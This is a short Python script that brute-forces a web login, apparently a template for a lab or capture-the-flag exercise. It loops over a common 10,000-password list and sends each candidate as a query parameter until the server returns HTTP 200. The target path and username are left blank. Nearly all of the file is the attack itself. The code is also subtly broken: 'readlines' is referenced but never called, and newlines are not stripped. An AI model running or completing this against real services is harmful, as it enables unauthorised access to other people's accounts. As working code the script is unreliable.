import requests


path = ""


def main():
    with open("./10-million-password-list-top-10000.txt", "r") as f:
        username = ""
        for l in f.readlines:
            query = f"?username={username}&password={l}"
            cookies = {}
            r = requests.get(path + query, cookies=cookies)
            if r.status_code == 200:
                return l
    


if __name__ == '__main__':
    print(main())